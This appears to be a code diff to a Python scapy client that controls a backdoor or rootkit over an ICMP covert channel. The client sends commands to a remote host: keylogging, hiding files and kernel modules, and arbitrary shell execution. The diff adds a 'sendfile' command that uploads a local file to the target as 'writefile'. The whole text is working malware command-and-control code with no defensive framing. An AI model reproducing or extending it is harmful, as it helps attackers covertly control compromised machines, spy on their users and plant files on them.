@@ -1,8 +1,15 @@
 import sys
 from scapy.all import sr1, IP, ICMP, sniff
 
-COMMANDS = ["mycat", "keylog", "hide", "unhide", "hidemod", "unhidemod", "randswitch"]
+COMMANDS = [
+    "mycat", "keylog",
+     "hide", "unhide",
+      "hidemod", "unhidemod",
+       "randswitch", "writefile"
+       ]
+
 PWD = "/"
+
 P = 1
 Q = 0
 P_inv = 1
@@ -37,6 +44,19 @@ def send_request(ip, payload):
     command = payload.split()[0] 
     if command == "myecho":
         payload = payload[len(command) + 1:]
+    elif command == "sendfile":
+        args = payload.split(" ")
+        if len(args) != 3:
+            print("sendfile got invalid number of args")
+            return True
+        try:
+            with open(args[2]) as f:
+                args[2] = f.read()
+            args[0] = "writefile"
+            payload = " ".join(args)
+        except IOError:
+            return True
+
     elif command not in COMMANDS:
         payload = "shell " + payload
     
@@ -62,7 +82,6 @@ def send_request(ip, payload):
             message = message.strip("\x00").strip()
             global PWD
             PWD = message.split("\n")[-1]
-            print(f"-----\n{PWD}\n-----")
             message = "\n".join(message.split("\n")[:-1])
         print(message, end="\n")
     return response is not None
